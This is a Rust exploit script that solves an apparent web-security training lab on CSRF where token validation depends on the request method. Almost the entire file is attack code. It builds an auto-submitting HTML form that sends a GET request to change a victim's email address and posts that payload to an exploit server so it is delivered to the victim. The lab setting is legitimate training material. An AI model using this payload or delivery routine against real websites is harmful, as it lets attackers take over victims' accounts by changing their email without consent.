/*********************************************************************************
*
* Lab: CSRF where token validation depends on request method
*
* Hack Steps: 
*      1. Craft an HTML form for changing the email address with an auto-submit
*         script and use the GET method rather than POST as the form method
*      2. Deliver the exploit to the victim
*      3. The victim's email will be changed after they trigger the exploit
*
**********************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0af3009d04a8795b834887fa00fb00eb.web-security-academy.net";

// Change this to your exploit server URL
const EXPLOIT_SERVER_URL: &str =
    "https://exploit-0a7700aa0460790a83388603017a00e1.exploit-server.net";

fn main() {
    let new_email = "hacked@you.com"; // You can change this to what you want
    let payload = format!(
        r###"<html>
                <body>
                <form action="{LAB_URL}/my-account/change-email">
                <input type="hidden" name="email" value="{new_email}" />
                    <input type="hidden" name="csrf" value="b2eUm7UybY24D3Jjnda5t2OUib3N2Cvr" />
                    <input type="submit" value="Submit request" />
                </form>
                <script>
                document.forms[0].submit();
                </script>
                </body>
                </html>"###
    );

    print!("{}", "❯❯ Delivering the exploit to the victim.. ",);
    io::stdout().flush().unwrap();

    deliver_exploit_to_victim(&payload);

    println!("{}", "OK".green());
    println!("🗹 The victim's email will be changed after they trigger the exploit");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn deliver_exploit_to_victim(payload: &str) {
    let response_head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8";
    let client = build_web_client();
    client
        .post(EXPLOIT_SERVER_URL)
        .form(&HashMap::from([
            ("formAction", "DELIVER_TO_VICTIM"),
            ("urlIsHttps", "on"),
            ("responseFile", "/exploit"),
            ("responseHead", response_head),
            ("responseBody", payload),
        ]))
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to deliver the exploit to the victim".red()
        ));
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::default())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
